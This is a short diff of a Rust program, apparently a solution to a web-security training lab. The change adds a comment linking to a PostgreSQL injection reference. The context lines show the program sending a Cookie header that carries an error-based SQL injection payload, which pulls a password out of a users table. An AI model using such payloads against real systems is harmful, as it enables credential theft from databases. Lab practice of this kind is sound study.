@@ -23,6 +23,7 @@ fn main() {
         .get(format!("{}/", lab_url))
         .header(
             COOKIE,
+            // https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-error-based
             "TrackingId=' AND (SELECT password FROM users LIMIT 1)::int=1 --",
         )
         .send()
